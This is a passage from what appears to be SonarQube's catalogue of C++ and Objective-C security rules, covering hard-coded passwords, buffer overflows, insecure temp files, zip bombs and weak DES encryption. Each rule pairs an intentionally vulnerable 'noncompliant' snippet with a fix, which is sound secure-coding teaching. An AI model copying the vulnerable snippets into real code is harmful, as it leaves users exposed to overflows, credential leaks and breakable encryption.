</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = "secret"; // Sensitive
dbi_conn_set_option(conn, "password", password.c_str());
</pre>
<h2>Compliant Solution</h2>
<pre>
dbi_conn conn = dbi_conn_new("mysql");
string password = getDatabasePassword(); // Compliant
dbi_conn_set_option(conn, "password", password.c_str()); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5798">
              cpp:S5798
            </a>
          </td>
          <td>
            <details>
              <p>If a buffer contains sensitive data, such as passwords or access tokens, it is good practice to overwrite the buffer before releasing the memory.
This ensures that the sensitive data is not available when that memory is reallocated. The <code>memset</code> function is commonly used for this
purpose.</p>
<h2>Why is this an issue?</h2>
<p>The C language specification allows the compiler to remove unnecessary code during the optimization phase. For example, when a memory buffer is
about to be destroyed, any writes to that buffer may be seen as unnecessary to the operation of the program. The compiler may choose to remove these
write operations.</p>
<p>When the <code>memset</code> function is used to clear sensitive data from memory and that memory is destroyed immediately afterward, the compiler
may see the <code>memset</code> call as unnecessary and remove it. The sensitive data will, therefore, remain in memory.</p>
<p>This rule raises an issue when a call to <code>memset</code> is followed by the destruction of the buffer.</p>
<h2>How to fix it</h2>
<p>The function <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset_s</code></a> behaves similarly to <code>memset</code>. The
main difference is that it cannot be optimized away and the memory will be overwritten in all cases. You should use <code>memset_s</code> to clear
security-sensitive data.</p>
<p>The <code>memset_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;string.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operation, such as <a
href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366877(v=vs.85)?redirectedfrom=MSDN">SecureZeroMemory</a> (Windows)
or <a href="https://www.freebsd.org/cgi/man.cgi?query=explicit_bzero">explicit_bzero</a> (FreeBSD).</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset(password, 0, strlen(password));  // Noncompliant
  memset(localToken, 0, strlen(localToken));  // Noncompliant
  free(password);
}
</pre>
<p>The <code>memset</code> calls may be optimized away because <code>password</code> is about to be freed and <code>localToken</code> is about to go
out of scope.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string&gt;

void f(char *password, size_t bufferSize) {
  char localToken[256];
  init(localToken, password);
  memset_s(password, bufferSize, 0, strlen(password));
  memset_s(localToken, sizeof(localToken), 0, strlen(localToken));
  free(password);
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> C++ reference - <a href="https://en.cppreference.com/w/c/string/byte/memset"><code>memset</code>, <code>memset_s</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://github.com/OWASP/ASVS/blob/master/4.0/en/0x16-V8-Data-Protection.md#v83-sensitive-private-data">Application Security
  Verification Standard 4.0 - 8.3.6</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/14">CWE-14 - Compiler Removal of Code to Clear Buffers</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1079">
              cpp:S1079
            </a>
          </td>
          <td>
            <details>
              <p>The <code>%s</code> format specifier is used to read a string into a buffer. If the input string exceeds the size of this buffer, a buffer overflow
can occur.</p>
<h2>Why is this an issue?</h2>
<p>By default, there is no limit on the length of the string being read. The <code>scanf</code> family of functions will continue to read characters
into the buffer until they encounter a whitespace character.</p>
<p>If the input contains a string that is long enough and lacks whitespace characters, it can result in memory beyond the end of the buffer being
overwritten. This situation is known as a buffer overflow vulnerability.</p>
<h3>What is the potential impact?</h3>
<p>An attacker could exploit this vulnerability to overwrite memory used by the application. This could result in the modification of application
data, unexpected behavior, or even cause the application to become unstable or crash. In some cases, the attacker might also gain control over the
execution flow of the application, leading to arbitrary code execution.</p>
<h2>How to fix it</h2>
<p>A field width can be used together with the <code>%s</code> format specifier. This places an upper limit on the number of characters that will be
read into the buffer.</p>
<p>Note that the <code>%s</code> format specifier always null-terminates the string in the buffer. You will need to ensure that the buffer is large
enough to hold the required input and the null terminator.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
char buffer[10];
scanf("%s", buffer);  // Noncompliant
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncomplia</code> will be stored in <code>buffer</code> and
<code>nt␀</code> will overwrite the contents of the memory immediately following <code>buffer</code>.</p>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
char buffer[10];
scanf("%9s", buffer);
</pre>
<p>If this code is given the word <code>noncompliant</code> as an input, <code>noncompli␀</code> will be stored in <code>buffer</code>.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/120">CWE-120 - Buffer Copy without Checking Size of Input</a> ('Classic Buffer Overflow')
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S5443">
              cpp:S5443
            </a>
          </td>
          <td>
            <details>
              <p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>\Windows\Temp</code> </li>
  <li> <code>\Temp</code> </li>
  <li> <code>\TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul>  </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;cstdio&gt;
// ...

void f() {
  FILE * fp = fopen("/tmp/temporary_file", "r"); // Sensitive
}
</pre>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
#include &lt;sstream&gt;
// ...

void f() {
  std::stringstream ss;
  ss &lt;&lt; getenv("TMPDIR") &lt;&lt; "/temporary_file"; // Sensitive
  FILE * fp = fopen(ss.str().c_str(), "w");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;cstdio&gt;
#include &lt;cstdlib&gt;
// ...

void f() {
  FILE * fp = tmpfile(); // Compliant
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/377">CWE-377 - Insecure Temporary File</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/379">CWE-379 - Creation of Temporary File in Directory with Incorrect Permissions</a>
  </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cpp:S1081">
              cpp:S1081
            </a>
          </td>
          <td>
            <details>
              <p>Insecure functions often involve handling data, such as strings and memory operations. The vulnerability arises when these functions do not
properly check or limit the size of the data they are handling.</p>
<h2>Why is this an issue?</h2>
<p>An attacker typically provides input that exceeds the expected size. This could be through a text field in a user interface, a file that the
program reads, or data sent over a network. The insecure function processes this input and places the result into a provided buffer.</p>
<p>If the input is larger than the buffer can handle, the insecure function will overwrite the memory following the buffer. This situation is known as
a buffer overflow vulnerability.</p>
<p>When using typical C or C++ functions, it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid
buffer overflows.</p>
<h3>What is the potential impact?</h3>
<h4>Code execution</h4>
<p>In some cases, an attacker can craft input in a way that allows them to gain unauthorized access to your system. For example, they might be able to
overwrite a function’s return address in memory, causing your program to execute code of the attacker’s choosing. This could potentially give the
attacker full control over your system.</p>
<h4>Denial of service</h4>
<p>If an attacker can trigger a buffer overflow by providing oversized input, it can cause the program to crash. If the attacker repeats this process,
it can continually disrupt the service, denying access to other users. This can be particularly damaging for services that require high availability,
such as online platforms or databases.</p>
<p>In some cases, the input might cause the program to enter an infinite loop or consume excessive memory, slowing down the system or even causing it
to become unresponsive. This type of attack is known as a resource exhaustion DoS attack.</p>
<h2>How to fix it</h2>
<p>Insecure functions should be replaced with safer alternatives that limit how much data can be written to the buffer.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;stdio.h&gt;

char str[20];
gets(str); // Noncompliant; `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
#include &lt;string.h&gt;

char buffer[20];
strcpy(buffer, input); // Noncompliant; `input` length is not checked and it may overflow `buffer`
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;stdio.h&gt;

char str[20];
gets_s(str, sizeof(str));
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
#define __STDC_WANT_LIB_EXT1__
#include &lt;string.h&gt;

char buffer[20];
strcpy_s(buffer, sizeof buffer, input);
</pre>
<h3>How does this work?</h3>
<p>C and C++ have a number of functions that are considered insecure because they do not perform bounds checking. Functions like <code>gets</code> are
known to be risky. Replace these with safer alternatives that include bounds checking. For example, instead of <code>gets</code>, use
<code>gets_s</code>.</p>
<p>The code can also checks if the size of input data is less than or equal to the size of a buffer (including the terminating null byte when dealing
with strings).</p>
<p>The <code>gets_s</code> function is defined in annex K of C11 and is optional for C11 compilers. It will only be available if the macro
<code>__STDC_LIB_EXT1__</code> is defined, and it must be enabled by defining the macro <code>__STDC_WANT_LIB_EXT1__</code> before including
<code>&lt;stdio.h&gt;</code>.</p>
<p>Other platform-specific functions can perform the same operations. For example, <code>strcpy</code> can be substituted with <a
href="https://learn.microsoft.com/en-us/windows/win32/api/strsafe/nf-strsafe-stringcbcopya">StringCbCopyA</a> (Windows) or <a
href="https://www.freebsd.org/cgi/man.cgi?query=strlcpy">strlcpy</a> (FreeBSD).</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Wikipedia - <a href="https://en.wikipedia.org/wiki/Buffer_overflow">Buffer overflow</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 - A06 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5982">
              objc:S5982
            </a>
          </td>
          <td>
            <details>
              <p>The purpose of changing the current working directory is to modify the base path when the process performs relative path resolutions. When the
working directory cannot be changed, the process keeps the directory previously defined as the active working directory. Thus, verifying the success
of chdir() type of functions is important to prevent unintended relative paths and unauthorized access.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The success of changing the working directory is relevant for the application. </li>
  <li> Changing the working directory is required by chroot to make the new root effective. </li>
  <li> Subsequent disk operations are using relative paths. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>After changing the current working directory verify the success of the operation and handle errors.</p>
<h2>Sensitive Code Example</h2>
<p>The <code>chdir</code> operation could fail and the process still has access to unauthorized resources. The return code should be verified:</p>
<pre>
const char* any_dir = "/any/";
chdir(any_dir); // Sensitive: missing check of the return value

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
fchdir(fd); // Sensitive: missing check of the return value
</pre>
<h2>Compliant Solution</h2>
<p>Verify the return code of <code>chdir</code> and handle errors:</p>
<pre>
const char* root_dir = "/jail/";
if (chdir(root_dir) == -1) {
  exit(-1);
} // Compliant

int fd = open(any_dir, O_RDONLY | O_DIRECTORY);
if(fchdir(fd) == -1) {
  exit(-1);
} // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/252">CWE-252 - Unchecked Return Value</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man2/chdir.2.html">man7.org</a> - chdir </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5832">
              objc:S5832
            </a>
          </td>
          <td>
            <details>
              <p>Pluggable authentication module (PAM) is a mechanism used on many UNIX variants to provide a unified way to authenticate users, independently of
the underlying authentication scheme.</p>
<h2>Why is this an issue?</h2>
<p>When authenticating users, if the validity of the account is not checked (not locked, not expired …​), it may lead to unauthorized access to
resources.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) { // Noncompliant
        return -1;
    }

    return 0;
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
int valid(pam_handle_t *pamh) {
    if (pam_authenticate(pamh, PAM_DISALLOW_NULL_AUTHTOK) != PAM_SUCCESS) {
        return -1;
    }
    if (pam_acct_mgmt(pamh, 0) != PAM_SUCCESS) {
        return -1;
    }

    return 0;
}
</pre>
<h3>How does this work?</h3>
<p>The account validity is checked with <code>pam_acct_mgmt</code> when authenticating a user with <code>pam_authenticate</code>.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> The Open Group - <a href="https://pubs.opengroup.org/onlinepubs/8329799/pam_acct_mgmt.htm"><code>pam_acct_mgmt</code></a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Packt hub - <a href="https://hub.packtpub.com/development-pluggable-authentication-modules-pam/">Development with Pluggable Authentication
  Modules (PAM)</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/304">CWE-304 - Missing Critical Step in Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5849">
              objc:S5849
            </a>
          </td>
          <td>
            <details>
              <p>Setting capabilities can lead to privilege escalation.</p>
<p>Linux capabilities allow you to assign narrow slices of <code>root</code>'s permissions to files or processes. A thread with capabilities bypasses
the normal kernel security checks to execute high-privilege actions such as mounting a device to a directory, without requiring (additional) root
privileges.</p>
<h2>Ask Yourself Whether</h2>
<p>Capabilities are granted:</p>
<ul>
  <li> To a process that does not require all capabilities to do its job. </li>
  <li> To a not trusted process. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Capabilities are high privileges, traditionally associated with superuser (root), thus make sure that the most restrictive and necessary
capabilities are assigned to files and processes.</p>
<h2>Sensitive Code Example</h2>
<p>When setting capabilities:</p>
<pre>
cap_t caps = cap_init();
cap_value_t cap_list[2];
cap_list[0] = CAP_FOWNER;
cap_list[1] = CAP_CHOWN;
cap_set_flag(caps, CAP_PERMITTED, 2, cap_list, CAP_SET);

cap_set_file("file", caps); // Sensitive
cap_set_fd(fd, caps); // Sensitive
cap_set_proc(caps); // Sensitive
capsetp(pid, caps); // Sensitive
capset(hdrp, datap); // Sensitive: is discouraged to be used because it is a system call
</pre>
<p>When setting SUID/SGID attributes:</p>
<pre>
chmod("file", S_ISUID|S_ISGID); // Sensitive
fchmod(fd, S_ISUID|S_ISGID); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/250">CWE-250 - Execution with Unnecessary Privileges</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/266">CWE-266 - Incorrect Privilege Assignment</a> </li>
  <li> <a href="https://forums.grsecurity.net/viewtopic.php?f=7&amp;t=2522">False Boundaries and Arbitrary Code Execution</a> </li>
  <li> <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux manual page</a> - capabilities(7) </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5042">
              objc:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul>
  <li> There is no validation of the number of entries in the archive. </li>
  <li> There is no validation of the total size of the uncompressed data. </li>
  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>
  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

void f(const char *filename, int flags) {
  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);

  if ((archive_read_open_filename(a, filename, 10240))) {
    return;
  }

  for (;;) {
    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      return;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#include &lt;archive.h&gt;
#include &lt;archive_entry.h&gt;
// ...

int f(const char *filename, int flags) {
  const int max_number_of_extraced_entries = 1000;
  const int64_t max_file_size = 1000000000; // 1 GB

  int number_of_extraced_entries = 0;
  int64_t total_file_size = 0;

  struct archive_entry *entry;
  struct archive *a = archive_read_new();
  struct archive *ext = archive_write_disk_new();
  archive_write_disk_set_options(ext, flags);
  archive_read_support_format_tar(a);
  int status = 0;

  if ((archive_read_open_filename(a, filename, 10240))) {
    return -1;
  }

  for (;;) {
    number_of_extraced_entries++;
    if (number_of_extraced_entries &gt; max_number_of_extraced_entries) {
      status = 1;
      break;
    }

    int r = archive_read_next_header(a, &amp;entry);
    if (r == ARCHIVE_EOF) {
      break;
    }
    if (r != ARCHIVE_OK) {
      status = -1;
      break;
    }

    int file_size = archive_entry_size(entry);
    total_file_size += file_size;
    if (total_file_size &gt; max_file_size) {
      status = 1;
      break;
    }
  }
  archive_read_close(a);
  archive_read_free(a);

  archive_write_close(ext);
  archive_write_free(ext);

  return status;
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/409">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>
  <li> <a href="https://www.bamsoftware.com/hacks/zipbomb/">bamsoftware.com</a> - A better Zip Bomb </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S6069">
              objc:S6069
            </a>
          </td>
          <td>
            <details>
              <p>When using <code>sprintf</code> , it’s up to the developer to make sure the size of the buffer to be written to is large enough to avoid buffer
overflows. Buffer overflows can cause the program to crash at a minimum. At worst, a carefully crafted overflow can cause malicious code to be
executed.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> if the provided buffer is large enough for the result of any possible call to the <code>sprintf</code> function (including all possible format
  strings and all possible additional arguments). </li>
</ul>
<p>There is a risk if you answered no to the above question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>There are fundamentally safer alternatives. <code>snprintf</code> is one of them. It takes the size of the buffer as an additional argument,
preventing the function from overflowing the buffer.</p>
<ul>
  <li> Use <code>snprintf</code> instead of <code>sprintf</code>. The slight performance overhead can be afforded in a vast majority of projects.
  </li>
  <li> Check the buffer size passed to <code>snprintf</code>. </li>
</ul>
<p>If you are working in C++, other safe alternative exist:</p>
<ul>
  <li> <code>std::string</code> should be the prefered type to store strings </li>
  <li> You can format to a string using <code>std::ostringstream</code> </li>
  <li> Since C++20, <code>std::format</code> is also available to format strings </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
sprintf(str, "%s", message);   // Sensitive: `str` buffer size is not checked and it is vulnerable to overflows
</pre>
<h2>Compliant Solution</h2>
<pre>
snprintf(str, sizeof(str), "%s", message); // Prevent overflows by enforcing a maximum size for `str` buffer
</pre>
<h2>Exceptions</h2>
<p>It is a very common and acceptable pattern to compute the required size of the buffer with a call to <code>snprintf</code> with the same arguments
into an empty buffer (this will fail, but return the necessary size), then to call <code>sprintf</code> as the bound check is not needed anymore. Note
that 1 needs to be added by the size reported by <code>snprintf</code> to account for the terminal null character.</p>
<pre>
size_t buflen = snprintf(0, 0, "%s", message);
char* buf = malloc(buflen + 1); // For the final 0
sprintf(buf, "%s", message);{code}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/">Top 10 2021 Category A6 - Vulnerable and Outdated
  Components</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">Top 10 2017 Category A9 -
  Using Components with Known Vulnerabilities</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/676">CWE-676 - Use of Potentially Dangerous Function</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/119">CWE-119 - Improper Restriction of Operations within the Bounds of a Memory
  Buffer</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=objc:S5547">
              objc:S5547
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that the cleartext of the encrypted message might be recoverable without prior knowledge of the key.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communication in various domains. They are used for
several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>For these reasons, as soon as cryptography is included in a project, it is important to choose encryption algorithms that are considered strong and
secure by the cryptography community.</p>
<h3>What is the potential impact?</h3>
<p>The cleartext of an encrypted message might be recoverable. Additionally, it might be possible to modify the cleartext of an encrypted message.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Theft of sensitive data</h4>
<p>The encrypted message might contain data that is considered sensitive and should not be known to third parties.</p>
<p>By using a weak algorithm the likelihood that an attacker might be able to recover the cleartext drastically increases.</p>
<h4>Additional attack surface</h4>
<p>By modifying the cleartext of the encrypted message it might be possible for an attacker to trigger other vulnerabilities in the code. Encrypted
values are often considered trusted, since under normal circumstances it would not be possible for a third party to modify them.</p>
<h2>How to fix it in Botan</h2>
<h3>Code examples</h3>
<p>The following code contains examples of algorithms that are not considered highly resistant to cryptanalysis and thus should be avoided.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
#include &lt;botan/cipher_mode.h&gt;

void encrypt() {
  Botan::Cipher_Mode::create("DES/CBC/PKCS7", Botan::ENCRYPTION); // Noncompliant
}
</pre>
